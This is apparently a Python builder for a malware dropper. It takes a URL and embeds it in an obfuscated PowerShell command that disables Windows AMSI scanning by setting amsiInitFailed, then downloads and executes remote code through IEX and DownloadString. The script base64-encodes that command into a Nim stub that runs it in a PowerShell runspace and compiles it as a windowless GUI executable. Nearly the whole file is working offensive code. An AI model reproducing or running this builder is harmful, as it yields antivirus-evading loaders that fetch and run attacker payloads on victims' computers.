from ast import While
import base64
from email.mime import base
from pdb import runcall
import sys, os, argparse, random, string
from time import sleep

graphical = """
  ___   _   _       _      ____                     
 |_ _| | \ | | ___ | |_   / ___|_ __ ___  ___ _ __  
  | |  |  \| |/ _ \| __| | |  _| '__/ _ \/ _ \ '_ \ 
  | |  | |\  | (_) | |_  | |_| | | |  __/  __/ | | |
 |___| |_| \_|\___/ \__|  \____|_|  \___|\___|_| |_| 
                                                                                                          
"""


stub = """
import winim/clr
import base64
var Automation = load("System.Management.Automation")
var RunspaceFactory = Automation.GetType("System.Management.Automation.Runspaces.RunspaceFactory")
var runspace = @RunspaceFactory.CreateRunspace()
runspace.Open()
var pipeline = runspace.CreatePipeline()
let strdecode = decode("REPLACED")
pipeline.Commands.AddScript(strdecode)
pipeline.Invoke()
runspace.Close()

"""
URL = """
Set-Variable -Name w -Value ('System.Management.Automation.A');Set-Variable -Name c -Value ('si');Set-Variable -Name m -Value ('Utils');Set-Variable -Name assembly -Value ([Ref].Assembly.GetType(('{0}m{1}{2}' -f $w,$c,$m)));Set-Variable -Name field -Value ($assembly.GetField(('am{0}InitFailed' -f $c),'NonPublic,Static'));$field.SetValue($null,$true);IEX (New-Object Net.WebClient).DownloadString("GREEN")
IEX (New-Object Net.WebClient).DownloadString("GREEN")
"""

def main(URL, stub, ):
    print(graphical)
    url = input("请输入网址：")        
    URL = URL.replace("GREEN", url)
    #int(URL)
    URL = base64.b64encode(URL.encode('utf-8')).decode("utf-8")     
    stub = stub.replace("REPLACED", URL)
    #print(stub)
    
    print("[+] 启用详细消息")
    f = open("stub.nim", "w")
    f.write(stub)
    f.close()
    sleep(1)
    print("[+] 将新存根保存到 stub.nim")
    sleep(1)
    print("[+] 编译新存根...")             
    os.system("nim c -r -d:mingw --app:gui stub.nim")
    print("[+] 已经编译成功stub.exe")
    #os.system("del stub.nim")
main(URL, stub)


